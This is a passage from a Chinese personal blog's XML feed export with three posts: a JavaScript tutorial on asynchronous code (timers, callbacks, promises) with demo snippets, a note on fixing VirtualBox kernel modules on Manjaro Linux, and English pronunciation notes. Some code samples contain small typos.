class="built_in">document</span>.querySelector(<span class="string">&#x27;.btn&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> myDate;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">        myDate = date;</span></span><br><span class="line"><span class="javascript">      &#125;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">console</span>.log(myDate);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> pElem = <span class="built_in">document</span>.createElement(<span class="string">&#x27;p&#x27;</span>);</span></span><br><span class="line"><span class="javascript">      pElem.textContent = <span class="string">&#x27;This is a newly-added paragraph.&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      wp.appendChild(pElem);</span></span><br><span class="line"><span class="javascript">    &#125;)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><div class='wrapper'>    <button class='btn'>Click</button></div><script>    const wp = document.querySelector('.wrapper');    const btn = document.querySelector('.btn');    btn.addEventListener('click', () => {      let myDate;      for(let i = 0; i < 10000000; i++) {        let date = new Date();        myDate = date;      }      console.log(myDate);      let pElem = document.createElement('p');      pElem.textContent = 'This is a newly-added paragraph.';      wp.appendChild(pElem);    })</script>可以看到点击click后，先做复杂运算，过段时间才会显示段落p（这两个没有逻辑关系）<p>这表明JS是一种同步的、阻塞的、单线程的语言，一次只能执行一个操作。但web浏览器定义了函数和API，允许我们当某些事件发生时不是按照同步方式，而是异步地调用函数(比如，时间的推移，用户通过鼠标的交互，或者获取网络数据)</p><p>在网络上，异步更为重要，如下面这个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = fetch(<span class="string">&#x27;myImage.png&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> blob = response.blob();</span><br></pre></td></tr></table></figure><p>因为不知道第一步下载图片的时间，所以第二步有可能会出错。需要等第一步返回才能进行第二步</p><p>有两种解决方案，以前的回调callback，和现在的promise，重点学习promise</p><p>不过在此之前要学习几个函数方便对异步的理解，这些函数设置的异步代码实际上在主线程上运行，但是您可以在迭代之间运行其他代码，运行效率或高或低，这取决于这些操作的处理器密集程度。</p><h2 id="异步函数"><a href="#异步函数" class="headerlink" title="异步函数"></a>异步函数</h2><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a><code>setTimeout()</code></h3><p>可以指定时间后运行代码</p><ul><li>第一个参数是函数引用</li><li>第二个参数是时间间隔，单位毫秒</li><li>后面是可变参数，这些参数会传递给第一个参数的函数</li></ul><p>返回一个标志，后续可根据这个标志使用<code>clearTimeout</code>取消这个任务，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> taskFlag = setTime(<span class="built_in">console</span>.log, <span class="number">2000</span>, <span class="string">&#x27;I love you&#x27;</span>);</span><br><span class="line"><span class="built_in">clearTimeout</span>(taskFlag);</span><br></pre></td></tr></table></figure><p>当时间间隔设置为0时，会在主线程执行后立刻执行</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">&#x27;World&#x27;</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line">alert(<span class="string">&#x27;Hello&#x27;</span>);<span class="comment">// Hello，world</span></span><br></pre></td></tr></table></figure><h3 id="setInterval"><a href="#setInterval" class="headerlink" title="setInterval()"></a><code>setInterval()</code></h3><p>与<code>setTimeout</code>的只执行一次不同，<code>setInterval</code>会循环执行，它的参数与<code>setTimeout</code>一致</p><p>一个数字时钟的例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;demo&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">displayTime</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span></span><br><span class="line"><span class="javascript">       <span class="keyword">let</span> time = date.toLocaleTimeString();</span></span><br><span class="line"><span class="javascript">       <span class="built_in">document</span>.getElementById(<span class="string">&#x27;demo&#x27;</span>).textContent = time;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> createClock = <span class="built_in">setInterval</span>(displayTime, <span class="number">1000</span>);<span class="comment">//每秒执行一次</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><div>    <p id='demo'></p></div><script>    function displayTime() {       let date = new Date();       let time = date.toLocaleTimeString();       document.getElementById('demo').textContent = time;    }    const createClock = setInterval(displayTime, 1000);</script>它同样会返回一个标志，使用clearInterval可以停止执行<p>下面是一个秒表例子</p><div>    <p id="clock"></p>    <button id='stop'>stop</button>    <button id='start'>start</button>    <button id='reset'>reset</button></div><script>    const stop = document.querySelector('#stop');    const start = document.querySelector('#start');    const reset = document.querySelector('#reset');  let sec=0, s=0, m=0, h=0;        // 存储setInterval的标志        let stopFlag;        // 初始化        displayCount();    // 所有点击事件    start.onclick = () => {        stopFlag = setInterval(displayCount, 1000);        start.disabled = true;    };    stop.onclick = () => {        clearInterval(stopFlag);        start.disabled = false;    };    reset.onclick = () => {        clearInterval(stopFlag);        sec = 0;        start.disabled = false;        displayCount();    }    function displayCount() {        time();        if(s<10) s = '0'+s;        if(m<10) m = '0'+m;        if(h<10) h = '0'+h;        timeText = h+':'+m+':'+s;        document.getElementById('clock').textContent = timeText;    }    function time() {        // 计算，可以使用math辅助        if(sec<3600){            h = 0;            m = parseInt(sec / 60);            s = sec % 60;        } else {            h = sec % 3600;            m = parseInt(sec / 60) - h;            s = sec % 60;        }        sec++;    }</script><p>源码(最开始使用Date来计时，但是由于暂停逻辑有点麻烦，就采用一个变量记录秒方便一点)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;clock&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&#x27;stop&#x27;</span>&gt;</span>stop<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&#x27;start&#x27;</span>&gt;</span>start<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&#x27;reset&#x27;</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> stop = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#stop&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> start = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#start&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> reset = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#reset&#x27;</span>);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// sec记录按下start的秒数</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> sec=<span class="number">0</span>, s=<span class="number">0</span>, m=<span class="number">0</span>, h=<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 存储setInterval的标志</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> stopFlag;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 初始化</span></span></span><br><span class="line"><span class="javascript">    displayCount();</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 所有点击事件</span></span></span><br><span class="line"><span class="javascript">    start.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        stopFlag = <span class="built_in">setInterval</span>(displayCount, <span class="number">1000</span>);</span></span><br><span class="line"><span class="javascript">        start.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    stop.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">clearInterval</span>(stopFlag);</span></span><br><span class="line"><span class="javascript">        start.disabled = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">    &#125;;</span></span><br><span class="line"><span class="javascript">    reset.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">clearInterval</span>(stopFlag);</span></span><br><span class="line"><span class="javascript">        sec = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        start.disabled = <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        displayCount();</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">displayCount</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        time();</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(s&lt;<span class="number">10</span>) s = <span class="string">&#x27;0&#x27;</span>+s;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(m&lt;<span class="number">10</span>) m = <span class="string">&#x27;0&#x27;</span>+m;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(h&lt;<span class="number">10</span>) h = <span class="string">&#x27;0&#x27;</span>+h;</span></span><br><span class="line"><span class="javascript">        timeText = h+<span class="string">&#x27;:&#x27;</span>+m+<span class="string">&#x27;:&#x27;</span>+s;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&#x27;clock&#x27;</span>).textContent = timeText;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">time</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 计算，可以使用math辅助</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(sec&lt;<span class="number">3600</span>)&#123;</span></span><br><span class="line"><span class="javascript">            h = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">            m = <span class="built_in">parseInt</span>(sec / <span class="number">60</span>);</span></span><br><span class="line"><span class="javascript">            s = sec % <span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            h = sec % <span class="number">3600</span>;</span></span><br><span class="line"><span class="javascript">            m = <span class="built_in">parseInt</span>(sec / <span class="number">60</span>) - h;</span></span><br><span class="line"><span class="javascript">            s = sec % <span class="number">60</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        sec++;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="递归setTimeout"><a href="#递归setTimeout" class="headerlink" title="递归setTimeout()"></a><code>递归setTimeout()</code></h3><p>递归的作用可以实现与<code>setInterval</code>一样的功能</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">funtion <span class="function"><span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">cosole.log(i);</span><br><span class="line">i++;</span><br><span class="line"><span class="built_in">setTimeout</span>(run,<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(run,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>与<code>setInterval</code>的区别</p><ul><li>setTimeout的时间间隔是固定的</li><li>setInterval的事件间隔包括了程序运行的时间</li><li>所以当代码花的时间比设置的间隔更长时建议使用递归</li></ul><h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p>这是一个比较老套的做法</p><p>比如<code>addEventListener()</code>的第二个参数就是异步，第一个参数监听事件，第二个参数就是当事件发生时调用的函数。第二个参数相当于只是传递了过去，并没有执行。</p><p>下面是官方的一个例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadAsset</span>(<span class="params">url, type, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">    xhr.responseType = type;</span><br><span class="line"></span><br><span class="line">    xhr.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        callback(xhr.response);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayImage</span>(<span class="params">blob</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> objectURL = URL.createObjectURL(blob);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> image = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    image.src = objectURL;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(image);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadAsset(<span class="string">&#x27;https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/blog/mito2.jpg&#x27;</span>, <span class="string">&#x27;blob&#x27;</span>, displayImage);</span><br></pre></td></tr></table></figure><p>当获取图片后对图片做一些处理</p><blockquote><p> 回调函数不一定都是异步的，如forEach</p></blockquote><h2 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>现代异步编程的常用方案，比回调、事件更加合理、强大。这里面很多东西比较晦涩难懂，我尽量梳理清楚</p><p>为了方便理解Promise，需要理清几个概念</p><h4 id="1-事件队列"><a href="#1-事件队列" class="headerlink" title="1.事件队列"></a>1.事件队列</h4><p>像promise这样的异步操作被放入事件队列中，事件队列在<strong>主线程完成处理后运行</strong>，这样它们就不会阻止后续JavaScript代码的运行。排队操作将尽快完成，然后将结果返回到JavaScript环境。</p><h4 id="2-回调和Promise"><a href="#2-回调和Promise" class="headerlink" title="2.回调和Promise"></a>2.回调和Promise</h4><p>使用监听鼠标事件，当鼠标点击就会执行事件（函数），也就是说这个事件被阻塞了，只有给定条件发生才会执行；同样Promise也是将里面的代码阻塞，然后监听的是资源是否获取到了，进而执行代码.</p><h4 id="3-promise里的状态"><a href="#3-promise里的状态" class="headerlink" title="3.promise里的状态"></a>3.promise里的状态</h4><p>每个promise对象都存在一个状态，初始状态叫<code>pending</code>，成功状态<code>fullfilled</code>，失败状态<code>rejected</code>，当从初始状态转化成失败或者成功时，就无法再改变状态</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">阮一峰的ES6入门教程之promise</a></li><li><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023024413276544">廖雪峰的JS教程</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/learn/JavaScript/%E5%BC%82%E6%AD%A5/%E7%AE%80%E4%BB%8B">MDN的JS异步简介</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Manjaro上使用virtualbox</title>
      <link href="/TechnicalExperience/Linux/Manjaro-virtualbox-install.html"/>
      <url>/TechnicalExperience/Linux/Manjaro-virtualbox-install.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a>安装问题</h3><p>使用<code>pacman -S virtualbox</code>后，打开创建新的新的虚拟机出现错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WARNING: The vboxdrv kernel module is not loaded. Either there is no module</span><br><span class="line">         available <span class="keyword">for</span> the current kernel (5.4.35-1-MANJARO) or it failed to</span><br><span class="line">         load. Please recompile the kernel module and install it by</span><br><span class="line"></span><br><span class="line">           sudo /sbin/vboxconfig</span><br><span class="line"></span><br><span class="line">         You will not be able to start VMs until this problem is fixed.</span><br></pre></td></tr></table></figure><span id="more"></span><p>说模块没有加载成功，需要使用<code>sudo /sbin/vboxconfig</code>修复，但实际上没有这个文件</p><p>参考<a href="https://wiki.archlinux.org/index.php/VirtualBox_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">在 Arch 里安装 VirtualBox</a>这篇文章后，我安装了两个模块</p><ol><li>virtualbox-host-dkms(需要看自己的内核版本安装, 比如我的是linux58-virtualbox-host-modules)</li><li>linux-lts-headers</li></ol><p>查看模块加载情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># manu @ MY in ~ [14:04:17] C:1</span></span><br><span class="line">$ sudo vboxreload                  </span><br><span class="line">Unloading modules: </span><br><span class="line">Loading modules: vboxnetadp vboxnetflt vboxdrv </span><br></pre></td></tr></table></figure><p>然后重新打开virtualbox，运行正常</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/vm-virtualbox.png" alt="virtualbox"></p><h2 id="代理问题"><a href="#代理问题" class="headerlink" title="代理问题"></a>代理问题</h2><p>网络使用NAT时, 虚拟机的网关其实就是物理机的localhost, 所以只需要在代理处填写<code>网关ip:物理机代理端口</code>就行了</p><blockquote><p>其实我考虑过端口转发, vbox设置的端口转发好像只支持从物理机转发到虚拟机</p><p>在host-only下, win7的防火墙会挡住来自主机的访问</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
            <tag> virtualbox </tag>
            
            <tag> 虚拟机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1-7口语笔记</title>
      <link href="/English/O/%E7%BE%8E%E5%BC%8F%E5%8F%A3%E8%AF%AD1-7.html"/>
      <url>/English/O/%E7%BE%8E%E5%BC%8F%E5%8F%A3%E8%AF%AD1-7.html</url>
      
        <content type="html"><![CDATA[<p> 此分类笔记参考淘宝浆糊老师的课程.</p><span id="more"></span><h2 id="T"><a href="#T" class="headerlink" title="T"></a>T</h2><h4 id="1-n后面的t不发音"><a href="#1-n后面的t不发音" class="headerlink" title="1.n后面的t不发音"></a>1.n后面的t不发音</h4><ul><li>You weren’<u>t</u> there.你不在那里</li><li>Are’<u>t</u> there all?不存在？</li><li>I do what I wan<u>t</u>.我做我想做的</li><li>It’s too hard, I can’<u>t</u> do this.</li><li>You can do i<u>t</u>.(t不发音)</li><li>You can’<u>t</u> park here.</li><li>Get me the presiden<u>t</u>.(Get&amp;president的t都不发音)</li><li>Ladies and gen<u>t</u>lemen!</li></ul><h4 id="2-t-元音-n-t不发音"><a href="#2-t-元音-n-t不发音" class="headerlink" title="2.t+元音+n,t不发音"></a>2.t+元音+n,t不发音</h4><ul><li>Have you ea<u>t</u>en?</li><li>Look behind the cur<u>t</u>ain.</li><li>Wri<u>tt</u>en can’t be unwri<u>tt</u>en.</li><li>It’s wri<u>tt</u>en in blood.</li><li>moun<u>t</u>ain</li><li>It’s impor<u>t</u>en<u>t</u> business.(两个t都不发音)</li></ul><h4 id="3-t-ly-t不发音"><a href="#3-t-ly-t不发音" class="headerlink" title="3.t+ly,t不发音"></a>3.t+ly,t不发音</h4><ul><li>La<u>t</u>ely,不久前</li><li>Comple<u>t</u>ely,完全的</li><li>Absolu<u>t</u>ely,当然啦</li><li>Defini<u>t</u>ely,绝对的</li><li>Exac<u>t</u>ly,必须的</li></ul><h4 id="4-s-t结尾-t不发音"><a href="#4-s-t结尾-t不发音" class="headerlink" title="4.s+t结尾,t不发音"></a>4.s+t结尾,t不发音</h4><ul><li>You jus<u>t</u> need to believe.</li><li>Best day ever</li><li>Last Christmas.</li><li>First day.</li><li>Must know.</li></ul><h4 id="5-句子结尾"><a href="#5-句子结尾" class="headerlink" title="5.句子结尾"></a>5.句子结尾</h4><ul><li>I can do that.</li><li>I can’t do that.</li></ul><h2 id="D"><a href="#D" class="headerlink" title="D"></a>D</h2><h4 id="1-n-d-d省略"><a href="#1-n-d-d省略" class="headerlink" title="1.n+d,d省略"></a>1.n+d,d省略</h4><ul><li>frien<u>d</u></li><li>gran<u>d</u>ma</li></ul><h2 id="闪音"><a href="#闪音" class="headerlink" title="闪音"></a>闪音</h2><p>把t,p,k叫作闪音，因为它们在某些条件下发的是d,b,g的音，下面元音指的是发音是元音</p><p>1.<strong>元音+闪音+元音</strong></p><ul><li>wa<u>t</u>er–&gt;wader</li><li>o<u>p</u>en–&gt;oben</li><li>ma<u>k</u>ing–&gt;maging</li><li>daugh<u>t</u>er</li><li>ma<u>tt</u>er</li><li>wo<u>k</u>e up</li><li>bro<u>k</u>e up</li><li>shu<u>t</u> up</li></ul><p>2.<strong>s+闪音+元音</strong></p><ul><li>s<u>k</u>y</li><li>s<u>p</u>eak</li><li>s<u>ch</u>ool</li><li>s<u>t</u>udent</li><li>You are making a mis<u>t</u>ake.</li><li>Wha<u>t</u> are you doing.</li><li>What are you gonna do?接下来你要做什么<ul><li>going to–&gt;gonna(口语)</li></ul></li><li>Wha<u>t</u> do you think?你怎么想</li><li>Wha<u>t</u> are you thinking?此时此刻你怎么想</li><li>Wha<u>t</u> are you loo<u>k</u>ing at?</li><li>ha<u>pp</u>y</li></ul><blockquote><p>在s与元音中间直接就是闪音，在元音与元音之间的说的慢就不是闪音</p></blockquote><h2 id="H"><a href="#H" class="headerlink" title="H"></a>H</h2><h4 id="句子中间的h不发音"><a href="#句子中间的h不发音" class="headerlink" title="句子中间的h不发音"></a>句子中间的h不发音</h4><p>注意，是句子中间开头为H单词，当它为句子开头时不能省</p><ul><li>Where is <u>h</u>e?</li><li>Who is <u>h</u>e?</li><li>Does <u>h</u>e have girlfriend?</li><li>He doesn’t want to talk to me, does <u>h</u>e?他不想和我说话，对吗？</li><li>You didn’t hear what <u>h</u>e said.你没听到他说什么</li><li>What’d he just say.他刚才说了什么</li><li>Why does <u>h</u>e keep saying that.他为什么这么说啊</li><li>What did <u>h</u>e do?(当需要强调时，语气很慢，可以不省略)<ul><li>What’d <u>h</u>e do？</li></ul></li><li>And he’s my brother.</li><li>Did he talk a lot about yogurt? </li><li>Where did he get that wine?</li><li>Where did he come from?</li><li>Where’d he go?</li><li>I’m gonna as<u>k</u> <u>h</u>er.</li><li>Punch him.搞他</li></ul><h2 id="R"><a href="#R" class="headerlink" title="R"></a>R</h2><p>当r后面没有元音时，发卷舌音</p><ul><li>car</li><li>park</li><li>hard</li><li>People are gonna love he<u>r</u>.</li><li>Sounds like it’s coming from the back of the ca<u>r</u>.</li></ul><p>当r后面有元音时，不发卷舌音</p><ul><li>The baby’s absolutely ado<u>r</u>able.</li><li>Now ge<u>t h</u>e<u>r out</u> of here.</li><li>I hea<u>r i</u>t too.</li></ul><h2 id="TH"><a href="#TH" class="headerlink" title="TH"></a>TH</h2><p>这是一个咬舌音，我们平常没有咬舌音，这个需要多加练习</p><p>/θ/：咬舌发出s音</p><ul><li>think </li><li>thank</li><li>I <u>th</u>ough<u>t i</u>t was “I made yogurt”.</li></ul><p>/δ/：咬舌发出z音</p><ul><li>this</li><li>that</li><li>That’s what confused me.</li><li>Do you see them.</li></ul><p>省略th发音的情况(通常说的快都会省略)</p><ul><li>What’s <del>th</del>a<del>t</del> suppose<del>d</del> to mean?</li><li>I understan<del>d th</del>a<del>t</del>.</li><li>You’re gonna love <del>th</del>em.</li><li>I put <del>th</del>em in this hat.</li><li>Hang in <del>th</del>ere.</li><li>We got <del>th</del>em now.</li></ul><h2 id="容易发错的音"><a href="#容易发错的音" class="headerlink" title="容易发错的音"></a>容易发错的音</h2><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><p>音标是/ri/,口语发‘re’</p><ul><li><u>re</u>lationship</li><li><u>re</u>member</li></ul><h3 id="of"><a href="#of" class="headerlink" title="of"></a>of</h3><p>o发ae的音，f不发音</p><ol><li><p>kind of</p><p>kind <u>of</u> have some big news.有一点大事</p><p>I’m kind of good.我这个人不错</p><p>I’m kind of busy.我有点忙</p><p>I’m kind of hungry.我有点恶了</p><p>I’m kind of broken.我差不多破产了</p><p>I’m kind of curious.我有点好奇</p></li><li><p>ou<u>t</u> of 发音–&gt; oudda</p><p>Let’s ge<u>t ou</u>dda here.我们逃出去</p></li><li><p>lot of –&gt; lodda</p><p>And a lodda people.</p></li><li><p>must <del>h</del>a<del>ve</del></p><p>I musta given him yours.我肯定把你的给他了</p><p>You musta moved.</p></li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li><p>because实际发音Cause</p></li><li><p>and –&gt; n </p><p>Prok and Roll</p></li><li><p>for –&gt; fer</p><p>Wai<del>t</del> for me.</p></li><li><p>something 念的快–&gt;some n(不会音标，将就着写)</p><p>Something bothering you？</p><p>I got something for you.</p></li><li><p>you(U) are(R) –&gt; (较快)you r –&gt; (最快)yer</p><p>You are right.</p><p>That’s why you are my favorite.</p></li><li><p>you在t后面发cha的音</p><p>Don’t you know.</p><p>Bu<u>t you</u> are girl.</p></li><li><p>you在d后面发jiu</p><p>Would you mind?</p></li><li><p>ing 发音 n</p><p>Wha<u>t a</u>re you do<u>ing</u>. –&gt; (快)Wha<u>t you</u> 